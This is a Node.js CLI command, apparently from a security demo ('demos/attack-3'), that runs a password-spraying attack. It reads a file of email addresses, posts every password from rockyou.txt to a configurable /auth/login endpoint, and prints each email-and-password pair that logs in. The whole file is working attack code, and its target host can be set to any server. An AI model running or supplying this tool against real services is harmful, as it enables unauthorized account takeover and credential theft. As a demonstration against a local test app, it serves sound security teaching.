const axios = require('axios');
const fs = require('fs');
const ProgressBar = require('progress');
const lineReader = require('n-readlines');

const Command = require('./command');

class RockYou extends Command {
  constructor() {
    super(
      'rockyou',
      'Accepts a file with email addresses and applies a password spraying attack with the credentials from rockyou.txt',
      [
        [ '<file>', 'The file with email addresses to try with RockYou.txt']
      ],
      [
        [ '-h', '--host <host>', 'The hostname for the API endpoint. Default is localhost.'],
        [ '-p', '--port <port>', 'The port for the API endpoint. Default is 3333.'],
        [ '-s', '--https', 'Use https for the connection.']
      ]
    );
  }

  async action(file, options) {
    const host = options.host ? options.host : 'localhost';
    const port = options.port ? options.port : '3333';
    const protocol = options.https ? 'https' : 'http'
    const url = `${protocol}://${host}:${port}/auth/login`;

    const rockyou = 'demos/attack-3/rockyou.txt';

    console.log(`Attacking ${url}`);

    const emails = fs.readFileSync(file, 'utf-8').split('\n');
    const numPasswords = this.lineCount(rockyou);
    console.log(`Spraying ${numPasswords} passwords across ${emails.length} email addresses\n`);

    const creds = [];
    const start = new Date();

    const bar = new ProgressBar('[:bar] :percent :etas', {
      complete: '=',
      incomplete: ' ',
      width: 50,
      total: numPasswords,
      renderThrottle: 100
    });

    const liner = new lineReader(rockyou);
    let password;
    while (password = liner.next()) {
      await Promise.all(emails.map(async (email) => {
        
        try {
          return axios.post(
            url, 
            { email, password: password.toString() }, 
            { validateStatus: () => true }
            ).then((res) => {
              if (res.status == 200)
                creds.push({ email, password });
            });
        } catch (err) {
          console.log(err);
        }
      }));
      bar.tick();

      // all passwords found?
      if (creds.length == emails.length)
        liner.close();
    }

    console.log(`\nDuration: ${(new Date() - start) / 1000} secs`);
    this.print(creds);
  }

  lineCount(filename) {
    let count = 0;
    let line;

    const liner = new lineReader(filename);
    while(line = liner.next()) {
      count++;
    }

    return count;
  }

  print(creds) {
    console.log(`Found ${creds.length} credentials\n`);
    if (creds.length > 0) 
      creds.forEach(cred => console.log(`${cred.email},${cred.password}`));
  }
}

module.exports = RockYou;